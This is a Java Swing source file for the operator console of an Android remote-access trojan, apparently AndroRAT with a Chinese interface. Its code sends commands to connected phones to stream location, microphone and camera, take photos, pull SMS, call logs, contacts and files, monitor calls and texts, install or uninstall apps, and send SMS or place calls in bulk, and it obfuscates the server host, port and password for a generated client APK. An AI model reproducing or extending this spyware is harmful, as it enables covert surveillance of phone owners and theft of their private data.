package com.android.security.gui;


import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;

import javax.imageio.ImageIO;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.KeyStroke;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;
import javax.swing.table.DefaultTableCellRenderer;

import org.apache.commons.codec.binary.Base64;

import com.android.security.gui.panel.ColorPane;
import com.android.security.gui.server.Server;
import com.android.security.inout.Protocol;
import com.android.security.packages.AdvancedInformationPacket;
import com.android.security.packages.CallPacket;
import com.android.security.packages.PreferencePacket;
import com.android.security.packages.SMSPacket;
import com.android.security.utils.Contact;
import com.android.security.utils.EncoderHelper;
import com.android.security.utils.Generator;
import com.android.security.utils.MyAPP;
import com.android.security.utils.MyFile;

public class GUI extends javax.swing.JFrame {
	
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JMenuItem buttonRemoveUser;
	private JMenuItem buttonUserGUI;
    private JMenuItem buttonExit;
    private JMenuItem buttonAbout;
    private JMenuItem buttonAirMode;
    private JMenu jMenu1;
    private JMenu jMenu2;
    private JMenuBar jMenuBar1;
    private JScrollPane jScrollPane1;
    private JScrollPane jScrollPane;
    private JTable userTable;
    private JSplitPane splitPane;

    private UserModel model;
    private HashMap<String, UserGUI> guiMap;
    
    private ColorPane logPanel;
    private Server server;
    private JCheckBoxMenuItem chckbxmntmShowLogs;
    private JMenu mnAbout;
    private JMenu mnBulkActions;
    private JMenuItem mntmToastit;
    private JMenuItem mntmSendSms;
    private JMenuItem mntmGiveCall;
    private JMenuItem mntmPort;
    private JMenuItem mntmGenertor;

    private SimpleDateFormat dateFormat;

    
    public GUI(Server server, int port) {
    	dateFormat= new SimpleDateFormat("MM-dd HH:mm:ss");
    	this.server = server;
    	guiMap = new HashMap<String, UserGUI>();

        initComponents();

        model = new UserModel();
        userTable.setModel(model);
        userTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        userTable.getColumnModel().getColumn(0).setCellRenderer(new MyRenderer());
        logPanel.append(Color.blue, this.dateFormat.format(new Date(System.currentTimeMillis()))+
        		" ===阳光远程手机管理服务=== 端口 :["+ port +"]\n");
        
        centrerTable(userTable);
        
        this.setLocationRelativeTo(null);
        this.setTitle("阳光远程手机管理系统     [" +port+"]");
        this.setVisible(true);
    }
    
    
    // *******************************
    //	M�thodes du log com.android.security.gui
    // *******************************
    
    public void logErrTxt(String txt) {
    	logPanel.append(Color.red, this.dateFormat.format(new Date(System.currentTimeMillis()))+ " "+txt+"\n");
    }
    
    public void logTxt(String txt) {
    	logPanel.append(Color.black, this.dateFormat.format(new Date(System.currentTimeMillis()))+ " "+txt+"\n");
    }
    
    public void clientLogTxt(String imei, long date, String txt) {
    	guiMap.get(imei).logTxt(date, txt);
    	//logPanel.append(Color.gray, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    
    public void clientErrLogTxt(String imei, long date, String txt) {
    	UserGUI g= guiMap.get(imei);
    	if(g!= null) g.errLogTxt(date, txt);
    	//guiMap.get(imei).errLogTxt(date, txt);
    	//logPanel.append(Color.red, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    

    
    // *******************************
    //	M�thodes des boutons du menu
    // *******************************
    
    private void buttonStartActionPerformed() {
    	try {
	    	for(int row = 0; row < userTable.getRowCount(); row++) {
	    		String imei = (String) model.getValueAt(row, 0);
	    		if(imei != null) server.commandSender(imei, Protocol.DISCONNECT, null);
	    	}
    	} catch(Exception e) {
    		//
    	} finally {
    		this.dispose();
    	}
    }
    
    private void buttonUserGUIActionPerformed() {
    	int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	
        	if(imei != null) {
	        	UserGUI gui = guiMap.get(imei);
	        	if(gui == null) {
	        		gui = new UserGUI(imei, this);
	        		guiMap.put(imei, gui);
	        	} else {
	        		gui.setVisible(true);
	        	}
        	}
        	
        } else {
        	JOptionPane.showMessageDialog(this,"请选择一个客户端先.","选择错误",JOptionPane.ERROR_MESSAGE);
        }
    }

    private void buttonRemoveUserActionPerformed() {
        int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	if(imei != null) {
	        	server.commandSender(imei, Protocol.DISCONNECT, null);
	        	this.deleteUser(imei);
        	}
        } else {
        	JOptionPane.showMessageDialog(this,"请选择一个客户端先.","选择错误",JOptionPane.ERROR_MESSAGE);
        }
    }
    
    private void buttonAirModeActionPerformed()
    {
        int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	if(imei != null) {
	        	server.commandSender(imei, Protocol.AIRPLANE_MODE, null);
	        	//this.deleteUser(imei);
        	}
        } else {
        	JOptionPane.showMessageDialog(this,"请选择一个客户端先.","选择错误",JOptionPane.ERROR_MESSAGE);
        }   	
    }
    
    private void buttonAboutActionPerformed() {
    	JOptionPane.showMessageDialog(this,"本服务端由Java语言编写而成，有好的建议请与作者联系。\n" +
    			"作者: A.Bertrand, R.David, A.Akimov & P.Junk, RealVachel\n" +
    			"请注意使用范围，仅供测试！","关于本软件",JOptionPane.INFORMATION_MESSAGE,
    			new ImageIcon(this.getIconImage()));
    }
   
    private void buttonShowLogs() {
    	if(chckbxmntmShowLogs.isSelected()) {
    		logPanel.setVisible(true);
    		jScrollPane.setVisible(true);
    		splitPane.setDividerLocation(0.5);
    	} else {
    		logPanel.setVisible(false);
    		jScrollPane.setVisible(false);
    		splitPane.setDividerLocation(1);
    	}
    }

    
    // *******************************
    //	M�thodes de modif du tableau
    // *******************************

    /**
     * Ajoute une ligne "client" dans le tableau des clients connectés
     * @param imei L'identifiant t�l�phone
     * @param countryCode Le code du pays o� se trouve l'appareil
     * @param telNumber Le numero de t�l�phone (si disponible) de l'appareil
     * @param simCountryCode Le pays d'enregitrement de la SIM
     * @param simSerial Le s�rial de la SIM
     * @param operator L'op�rateur o� se trouve l'appareil
     * @param simOperator L'op�rateur de la carte SIM
     */
    /*
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
        if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        model.addUser(new User(imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
    }*/
    
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator,String inet) {
    	
    	if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        if(inet == null) inet ="-";
        model.addUser(new User(countryCode,imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial,inet));
    }
    
	public class MyRenderer extends DefaultTableCellRenderer
	{

		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
		{
			String country = (String) value;
			ImageIcon getImg;
			//country = "fr";
			File f = new File("src/com/android/security/gui/res/Drapeau/" + country.toUpperCase() + ".png");
			if (f.exists())
			{
				getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
				UserGUI.class.getResource("/com/android/security/gui/res/Drapeau/" + country.toUpperCase() + ".png")));
			} else
			getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/com/android/security/gui/res/Drapeau/default.jpeg")));

			Image img = getImg.getImage();
			Image newimg = img.getScaledInstance(64, 64, java.awt.Image.SCALE_SMOOTH);
			ImageIcon imgResize = new ImageIcon(newimg);
			setIcon(imgResize);
			return this;
		}
	}
    //-------------------------------------------------

    /**
     * Enl�ve de la table des clients, le client mis en param�tre
     * @param imei L'identifiant du client � supprimer
     */
    public void deleteUser(String imei) {
        model.removeUser(imei);
        UserGUI gui = guiMap.get(imei);
        if(gui != null) {
	        if(gui.isVisible()) gui.launchMessageDialog("客户端已下线，操作页面关闭 ", "关闭", JOptionPane.ERROR_MESSAGE);
	        gui.dispose();
        }
        guiMap.remove(imei);
        getContentPane().repaint();
    }
    
    /**
     * M�thode appel�e par les UserGUI lors de leur fermeture afin de supprimer la r�f�rence dans la HashMap
     * @param imei L'identifiant de la fenetre
     */
    public void closeUserGUI(String imei) {
    	guiMap.remove(imei);
    }
    
    
    // *******************************
    //	M�thodes de modif des userGUI
    // *******************************
    
    public void updateAdvInformations(String imei, AdvancedInformationPacket packet) {
    	UserGUI user = guiMap.get(imei);
    	user.updateHomeInformations(packet);
    }
    
    public void updatePreference(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePreference(ip, port, wait, phones, sms, kw);
    }
    
    public void updateUserMap(String imei, double lon, double lat, double alt, float speed, float accuracy) {
    	UserGUI user = guiMap.get(imei);
    	user.updateMap(lon, lat, alt, speed, accuracy);
    }
    
    public void updateUserPicture(String imei, byte[] picture) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePicture(picture);
    }
    
    public void addSoungBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addSoundBytes(data);
    }
    
    public void addVideoBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addVideoBytes(data);
    }
    
    public void updateFileTree(String imei, ArrayList<MyFile> fileList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateFileTree(fileList);
    }
    
    public void updateUserCallLogs(String imei, ArrayList<CallPacket> logsList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateCallLogs(logsList);
    }
    
    public void updateContacts(String imei, ArrayList<Contact> contacts) {
    	UserGUI user = guiMap.get(imei);
    	user.updateContacts(contacts);
    }
    
    public void addMonitoredCall(String imei, int type, String phoneNumber) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredCall(type, phoneNumber);
    }
    
    public void addMonitoredSMS(String imei, String addr, long date, String body) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredSMS(addr, date, body);
    }
    
    public void updateSMS(String imei, ArrayList<SMSPacket> sms) {
    	UserGUI user = guiMap.get(imei);
    	user.updateSMS(sms);
    }
    
    
    // *******************************
    //	M�thodes pour save le channel
    // *******************************
    
    
    public void saveMapChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMapChannel(channel);
    }
    
    public void saveCallLogChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveCallLogChannel(channel);
    }
    
    public void saveContactChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveContactChannel(channel);
    }
    
    public void saveMonitorSMSChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorSMSChannel(channel);
    }
    
    public void saveMonitorCallChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorCallChannel(channel);
    }
    
    public void savePictureChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.savePictureChannel(channel);
    }
    
    public void saveSoundChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveSoundChannel(channel);
    }
    
    public void saveVideoChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveVideoChannel(channel);
    }
    
    public void saveSMSChannel(String imei, int channel) {
    	// TODO
    }
    
    
    // *******************************
    //	M�thodes pour les UserGUI
    // *******************************
    
	public void urlDownloadFile(String imei, String urlString, String savePath) {
		HashMap<String, String> urlInfo = new HashMap<String, String>();
		try {
			urlInfo.put("url", new String(urlString.getBytes("utf-8"), "utf-8"));
			urlInfo.put("dir", new String(savePath.getBytes("utf-8"), "utf-8"));
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			// e.printStackTrace();
			logErrTxt("URL或者Dir 编码不支持");
		}

		this.server.commandSender(imei, Protocol.URL_DOWNLOAD_FILE,
				EncoderHelper.encodeHashMap(urlInfo));
	}

	public void installAPK(String imei, String path) {
		try {
			this.server.commandSender(imei, Protocol.INSTALL_APK,
					path.getBytes("utf-8"));
		} catch (UnsupportedEncodingException e) {
			logErrTxt("无法将apk路径编码");
		}
	}

	public void getAPPList(String imei) {
		this.server.commandSender(imei, Protocol.GET_APP_LIST, null);
	}

	public void updateAPPList(String imei, ArrayList<MyAPP> list) {
		
    	UserGUI user = guiMap.get(imei);
    	user.updateAPPList(list);
	}

	public void processAPP(String device, String appName) {
		try {
			this.server.commandSender(device, Protocol.PROCESS_APP,
					appName.getBytes("utf-8"));
		} catch (UnsupportedEncodingException e) {
			logErrTxt("无法将app路径编码");
		}
	}

	public void uninstallAPP(String device, String appName) {
		try {
			this.server.commandSender(device, Protocol.UNINSTALL_APP,
					appName.getBytes("utf-8"));
		} catch (UnsupportedEncodingException e) {
			logErrTxt("无法将app路径编码");
		}
	}

    public void fireGetAdvInformations(String imei) {
    	server.commandSender(imei, Protocol.GET_ADV_INFORMATIONS, null);
    	server.commandSender(imei, Protocol.GET_PREFERENCE, null);
    }
    
    public void fireGetSMS(String imei, String req) {
    	server.commandSender(imei, Protocol.GET_SMS, req.getBytes());
    }
    
    public void fireStartGPSStreaming(String imei, String provider) {
    	server.commandSender(imei, Protocol.GET_GPS_STREAM, provider.getBytes());
    }
    
    public void fireStopGPSStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_GPS_STREAM, null, channel);
    }
    
    public void fireStartSoundStreaming(String imei, int source) {
    	byte[] byteSource = ByteBuffer.allocate(4).putInt(source).array();
    	server.commandSender(imei, Protocol.GET_SOUND_STREAM, byteSource);
    }
    
    public void fireStopSoundStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null, channel);
    }
    
    public void fireStartVideoStream(String imei) {
    	server.commandSender(imei, Protocol.GET_VIDEO_STREAM, null);
    }
    
    public void fireStopVideoStream(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);
    }
    
    public void fireTakePicture(String imei) {
    	server.commandSender(imei, Protocol.GET_PICTURE, null);
    }
    
    public void fireFileDownload(String imei, String path, String downPath, String downName) {
    	server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(), downPath, downName);
    }
    
    public void fireTreeFile(String imei) {
    	server.commandSender(imei, Protocol.LIST_DIR, "/".getBytes());
    }
    
    public void fireToastMessage(String imei, String txt) {
    	server.commandSender(imei, Protocol.DO_TOAST, txt.getBytes());
    }
    
    public void fireVibrate(String imei, Long duration) {
    	server.commandSender(imei, Protocol.DO_VIBRATE, EncoderHelper.encodeLong(duration));
    }
    
    public void fireBrowseUrl(String imei, String url) {
    	server.commandSender(imei, Protocol.OPEN_BROWSER, url.getBytes());
    }
    
    public void fireSendSMS(String imei, HashMap<String, String> map) {
    	byte[] data = EncoderHelper.encodeHashMap(map);
    	server.commandSender(imei, Protocol.SEND_SMS, data);
    }
    
    public void fireGiveCall(String imei, String target) {
    	server.commandSender(imei, Protocol.GIVE_CALL, target.getBytes());
    }
    
    public void fireCallLogs(String imei, String request) {
    	server.commandSender(imei, Protocol.GET_CALL_LOGS, request.getBytes());
    }
    
    public void fireContacts(String imei) {
    	server.commandSender(imei, Protocol.GET_CONTACTS, null);
    }
    
    public void fireStartCallMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_CALL, EncoderHelper.encodeHashSet(phoneNumbers));
    }
    
    public void fireStopCallMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null, channel);
    }
    
    public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_SMS, EncoderHelper.encodeHashSet(phoneNumbers));
    }
    
    public void fireStopSMSMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
    }
    
    public void fireSaveConnectConfiguration(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms, kw);
    	server.commandSender(imei, Protocol.SET_PREFERENCE, pp.build());
    }
    
    
    
    
    private void fireBulkToast() {
       
    	String txt = JOptionPane.showInputDialog(this, "输入内容:");
    	if(txt != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireToastMessage(imei, txt);
    		}
    	}
    }
    
    private void fireBulkSMS() {
    	SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			
			for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireSendSMS(imei, map);
    		}
		}
    }
    
    
    private void testInfo(String host, String port,
			String password)
    {
    		String config = host + " " + port + " " + password;
    		byte[] buf = null;
    		try {
    			buf = config.getBytes("utf-8");
    		} catch (UnsupportedEncodingException e) {
    		}

    		byte[] buf1 = new byte[buf.length];
    		for (int i = 0; i < buf.length; i++) {
    			buf1[i] = (byte) (buf[i] - 1);
    		}
    		byte[] buf2 = Base64.encodeBase64(buf1);
    		byte[] buf3 = new byte[buf2.length];
    		for (int i = 0; i < buf2.length; i++) {
    			buf3[i] = (byte) (buf2[i] - 1);
    		}
    		
    		logTxt("--------------------------"+new String(buf3));
    }
    
    private void fireGeneratorApk() {
		CreateServerDialog dialog = new CreateServerDialog(this);
		String[] res = dialog.showDialog();

		if (res != null) {
			String host = res[0];
			String port = res[1];
			String passwd = res[2];
			if ((host.length() < 4) || (port.length() < 1) ) {
				logErrTxt("请输入完整配置信息");
				return;
			}
			
			testInfo(host,port,passwd);
		}
	/*	
		File clientDir = new File("client");			
		logTxt(clientDir.getAbsolutePath());

		if (res != null) {
			String host = res[0];
			String port = res[1];
			String passwd = res[2];
			if ((host.length() < 4) || (port.length() < 1) ) {
				logErrTxt("请输入完整配置信息");
				return;
			}
			
			
			if (Generator.generateConfig(host, port, passwd)) {
				
				try {
					String path = Generator.generateApk();
					logTxt("生成成功: " + path);
					return;
				} catch (Exception e) {
					logErrTxt("生成失败：" + e.getMessage());
				}
			} else {
				logErrTxt("无法为apk生成配置文件");
			}
		}*/
	}
    
    
    private void fireBulkCall() {
    	String target = JOptionPane.showInputDialog(this, "输入被呼叫号码:");
    	if(target != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireToastMessage(imei, target);
    		}
    	}
    }
    
    private void fireSelectPort() {
    	String rep = JOptionPane.showInputDialog(this, "输入新的端口(需要重启服务) : ");
    	server.savePortConfig(rep);
    }
    
    private void userMouseClicked(MouseEvent e) {
    	if(e.getClickCount() == 2) {
	    	this.buttonUserGUIActionPerformed();
    	}
    }
    
    
    
    
    /**
     * Fonction g�n�rant les �l�ments SWING de l'interface graphique
     * NE PAS TOUCHER !!
     */
    private void initComponents() {
    	
    	try {
    		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

    	BufferedImage image = null;
        try {
            image = ImageIO.read(
                this.getClass().getResource("/com/android/security/gui/res/androrat_logo_32pix.png"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        this.setIconImage(image);
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        buttonExit = new javax.swing.JMenuItem();
        jMenu2 = new javax.swing.JMenu();
        buttonRemoveUser = new javax.swing.JMenuItem();
        buttonUserGUI = new javax.swing.JMenuItem();
        buttonAirMode = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jMenu1.setText("服务端");

        buttonExit.setText("退出");
        buttonExit.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonStartActionPerformed();
            }
        });
        jMenu1.add(buttonExit);
        
        chckbxmntmShowLogs = new JCheckBoxMenuItem("显示日志");
        chckbxmntmShowLogs.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		buttonShowLogs();
        	}
        });
        
        mntmPort = new JMenuItem("服务端口");
        mntmPort.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		fireSelectPort();
        	}
        });
        jMenu1.add(mntmPort);
        
        chckbxmntmShowLogs.setSelected(true);
        jMenu1.add(chckbxmntmShowLogs);

        jMenuBar1.add(jMenu1);

        jMenu2.setText("客户端操作");
        
        buttonUserGUI.setText("打开远程界面");
        buttonUserGUI.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U, InputEvent.CTRL_MASK));
        buttonUserGUI.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonUserGUIActionPerformed();
            }
        });
        jMenu2.add(buttonUserGUI);

        buttonRemoveUser.setText("断开连接");
        buttonRemoveUser.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
        buttonRemoveUser.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonRemoveUserActionPerformed();
            }
        });
        jMenu2.add(buttonRemoveUser);

        
        buttonAirMode.setText("飞行模式");
        buttonAirMode.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_M, InputEvent.CTRL_MASK));
        buttonAirMode.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
            	buttonAirModeActionPerformed();
            }
        });
        jMenu2.add(buttonAirMode);
        
        jMenuBar1.add(jMenu2);

        setJMenuBar(jMenuBar1);
        
        mnBulkActions = new JMenu("扩展功能");
        jMenuBar1.add(mnBulkActions);
        
        mntmToastit = new JMenuItem("屏幕消息");
        mntmToastit.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkToast();
        	}
        });
        mnBulkActions.add(mntmToastit);
        
        mntmSendSms = new JMenuItem("发送短信");
        mntmSendSms.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkSMS();
        	}
        });
        mnBulkActions.add(mntmSendSms);
        
        mntmGenertor = new JMenuItem("创建服务端");
        mntmGenertor.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireGeneratorApk();
        	}
        });
        mnBulkActions.add(mntmGenertor);
       
        
        
        
        mntmGiveCall = new JMenuItem("拨打电话");
        mntmGiveCall.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkCall();
        	}
        });
        mnBulkActions.add(mntmGiveCall);
        
        mnAbout = new JMenu("关于");
        jMenuBar1.add(mnAbout);
        buttonAbout = new javax.swing.JMenuItem();
        mnAbout.add(buttonAbout);
        
        buttonAbout.setText("关于本软件");
        buttonAbout.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonAboutActionPerformed();
            }
        });
        
        splitPane = new JSplitPane();
        splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        layout.setHorizontalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 671, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE)
        );
        
        jScrollPane = new JScrollPane();
        splitPane.setRightComponent(jScrollPane);
        
        logPanel = new ColorPane();
        jScrollPane.setViewportView(logPanel);
        
        jScrollPane1 = new javax.swing.JScrollPane();
        splitPane.setLeftComponent(jScrollPane1);
        splitPane.setDividerLocation(200);
        userTable = new javax.swing.JTable();
        userTable.setRowMargin(3);
        userTable.setRowHeight(48);
        userTable.setFont(new Font("Dialog", Font.PLAIN, 14));
        userTable.setAutoResizeMode(JTable.AUTO_RESIZE_NEXT_COLUMN);
        userTable.addMouseListener(new MouseAdapter() {
        	@Override
        	public void mouseClicked(MouseEvent e) {
        		userMouseClicked(e);
        	}
        });
        jScrollPane1.setViewportView(userTable);
        getContentPane().setLayout(layout);
        
        pack();
    }
    
    private void centrerTable(JTable table) {     DefaultTableCellRenderer custom = new DefaultTableCellRenderer(); 
	    custom.setHorizontalAlignment(JLabel.CENTER);
	    userTable.getColumnModel().getColumn(0).setPreferredWidth(56);
	    for (int i=1 ; i<table.getColumnCount() ; i++) 
	    	table.getColumnModel().getColumn(i).setCellRenderer(custom); 
    }
}
